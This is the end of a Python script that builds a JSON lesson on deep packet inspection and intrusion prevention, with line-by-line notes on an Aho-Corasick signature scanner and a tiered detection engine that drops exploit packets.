                {"line": 9, "note": "AhoCorasickDPIScanner attaches full threat signature records to trie leaf nodes."},
                {"line": 40, "note": "Follow failure links and dictionary suffix links to discover all overlapping attacks."},
                {"line": 49, "note": "Emit structured ThreatDetection objects with severity, attack name, and byte offset."},
                {"line": 67, "note": "Execute sample scan detecting critical Log4j exploit string in HTTP POST request."}
            ],
            "check": part4_check
        },
        {
            "title": "Grand Capstone Project: End-to-End Enterprise Deep Packet Inspection & Autonomous Intrusion Prevention Engine",
            "say": part5_say,
            "example": part5_example,
            "tryIt": part5_tryIt,
            "code": part5_code,
            "output": part5_output,
            "codeNotes": [
                {"line": 13, "note": "EnterpriseDPIEngine integrates pre-filter, ring buffer, and Aho-Corasick scanner."},
                {"line": 23, "note": "Tier 1: fast pre-filter screening allows 99 percent of legitimate packets immediately."},
                {"line": 32, "note": "Tier 2: ring buffer boundary concatenation and in-depth automaton scanning."},
                {"line": 36, "note": "Execute autonomous mitigation: DROP critical exploits, ALERT on suspicious anomalies."},
                {"line": 56, "note": "Feed simulated packet stream and verify that clean packets pass while exploits are dropped."}
            ],
            "check": part5_check
        }
    ],
    "projectStep": project_step,
    "summary": summary
}

with open("scripts/branch_c/day40_lesson.json", "w", encoding="utf-8") as f:
    json.dump(day40_lesson, f, indent=2)
print("day40_lesson.json successfully generated.")
